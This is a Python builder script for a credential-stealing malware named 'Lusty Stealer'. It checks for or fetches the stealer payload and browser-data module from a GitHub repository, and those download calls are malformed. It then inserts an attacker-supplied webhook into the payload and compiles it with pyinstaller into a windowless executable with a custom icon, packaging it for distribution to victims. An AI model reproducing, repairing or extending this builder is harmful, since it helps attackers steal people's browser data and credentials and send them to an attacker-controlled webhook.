import os
import datetime
import time
import colorama
import requests
from colorama          import Fore, Back, Style


w = Fore.WHITE
b = Fore.BLUE
c = Fore.CYAN
r = Fore.RED
m = Fore.MAGENTA
g = Fore.GREEN
y = Fore.YELLOW
lc = Fore.LIGHTCYAN_EX
rs = Fore.RESET

def main():
    print(f"""
                {m}        ________           ________
                {m}     /  ______  \       /  ______  \
                {m}   /  /        \  \   /  /        \  \
                {m} /  /            \  "  /            \  \
                {m}|  |               \ /               |  |
                {m}|  |                "                |  |
                {m}|  |                                 |  |
                {m} |  |                               |  |
                {m}  |  |                             |  |
                {m}    |  |                         |  |
                {m}      |  |                     |  |
                {m}        |  |                 |  |
                {m}          |  |             |  |
                {m}            |  |         |  |      - Lusty Stealer
                {m}              |  |     |  |       - Developer Lust
                {m}                |  | |  |        - Version 1.1.1{rs}
                {m}                  | | |
                {m}                   | |
                {m}                    |
    """)

    print(f"{datetime.datetime.now()}   [ {y}PROGRAM {w}| {y}CHECK {w}] Checking for updates...")
    time.sleep(3)
    print(f"{datetime.datetime.now()}   [ {y}PROGRAM {w}| {y}CHECK {w}] Checking for MODUELS...")
    time.sleep(2)
    try: 
        os.system("pip install -r requirements.txt")
        os.system("cls")
    except Exception as e:
        print(f"{datetime.datetime.now()}   [ {r}PROGRAM {w}| {r}ERROR {w}] Error while installing MODUELS: {e}")

    print(f"""

                {m}        ________           ________
                {m}     /  ______  \       /  ______  \
                {m}   /  /        \  \   /  /        \  \
                {m} /  /            \  "  /            \  \
                {m}|  |               \ /               |  |
                {m}|  |                "                |  |
                {m}|  |                                 |  |
                {m} |  |                               |  |
                {m}  |  |                             |  |
                {m}    |  |                         |  |
                {m}      |  |                     |  |
                {m}        |  |                 |  |
                {m}          |  |             |  |
                {m}            |  |         |  |      - Lusty Stealer
                {m}              |  |     |  |       - Developer Lust
                {m}                |  | |  |        - Version 1.1.1{rs}
                {m}                  | | |
                {m}                   | |
                {m}                    |
                                                 
    """)
    print(f"{datetime.datetime.now()}   [ {y}PROGRAM {w}| {y}CHECK {w}] Checking for Noxious file")
    time.sleep(2)
    if os.path.exists("./src/main.py"):
        print(f"{datetime.datetime.now()}   [ {g}PROGRAM {w}| {g}CHECK {w}] Noxious file found")
    if os.path.exists("./src/moduels/figgy.py"):
        print(f"{datetime.datetime.now()}   [ {g}PROGRAM {w}| {g}CHECK {w}] Browsers file found")
    else:
        print(f"{datetime.datetime.now()}   [ {r}PROGRAM {w}| {r}ERROR {w}] Noxious file not found")
        print(f"{datetime.datetime.now()}   [ {r}PROGRAM {w}| {r}ERROR {w}] Browsers file not found")
        print(f"{datetime.datetime.now()}   [ {y}PROGRAM {w}| {y}CHECK {w}] Downloading Noxious files...")
        time.sleep(2)
        requests.get("https://raw.githubusercontent.com/datascraped/lusty-stealer/main/src/main.py -o ./src/main.py")
        requests.get("https://raw.githubusercontent.com/datascraped/lusty-stealer/main/src/modules/figgy.py -o ./src/modules/figgy.py")
        print(f"{datetime.datetime.now()}   [ {g}PROGRAM {w}| {g}CHECK {w}] Noxious file downloaded 'src/noxious.py' ")
        time.sleep(2)
        print(f"{datetime.datetime.now()}   [ {g}PROGRAM {w}| {g}COMPILATION {w}] Proceeeding to building Noxious file...")
    
    webhook = input(f"{datetime.datetime.now()}   [ {y}PROGRAM {w}| {y}WEBHOOK {w}] Enter Webhook : ")
    filename = input(f"{datetime.datetime.now()}   [ {y}PROGRAM {w}| {y}FILENAME {w}] Enter Filename : ")
    icon = input(f"{datetime.datetime.now()}   [ {y}PROGRAM {w}| {y}ICON PATH {w}] Enter Icon Path : ")
    print(f"{datetime.datetime.now()}   [ {y}PROGRAM {w}| {y}COMPILATION {w}] Building Noxious file...")
    time.sleep(2)

    with open("./src/main.py", "r", encoding="utf-8") as f:
        raw = f.read()

    with open(f"{filename}.py", "w", encoding="utf-8") as f:
        f.write(raw.replace("%webhook%", f"{webhook}"))


    os.system(f"pyinstaller --onefile --noconsole  --icon {icon} --distpath ./ .\{filename}.py")
    os.remove(f".\{filename}.py")
    os.remove(f".\{filename}.spec")

if __name__ == "__main__":
    main()
